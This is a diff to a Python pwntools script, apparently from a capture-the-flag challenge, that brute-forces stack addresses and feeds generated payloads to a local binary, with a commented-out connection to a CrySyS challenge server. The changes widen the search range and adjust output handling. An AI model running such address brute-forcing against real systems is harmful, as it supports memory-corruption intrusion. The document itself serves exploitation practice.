@@ -8,18 +8,18 @@ base = 0x7fffffffd000
 # base = 0x7fffffff0000
 # i = 0x10000
 # i = 0xd950
-i = 0x950
-while i < 0x960:
+i = 0x0
+while i < 0x1000:
 
     addr = base + i
     sys.stdout.write(f'\r{hex(addr)}')
     sys.stdout.flush()
-    os.system(f'./generate_input {hex(addr)} 1')
+    os.system(f'./generate_input {hex(addr)}')
 
     with open('input', mode='rb') as file:
         fileContent = file.read()
 
-        conn = pwn.process('./me')
+        conn = pwn.process('./me', stderr=pwn.PIPE)
         #conn = pwn.remote('challenges.crysys.hu', 5010)
 
         r = conn.recvline().decode('ascii')
@@ -36,7 +36,6 @@ while i < 0x960:
                 pass
             else :
                 print()
-                print(line)
         print(r)
         conn.close()
         if 'cd21' in r:
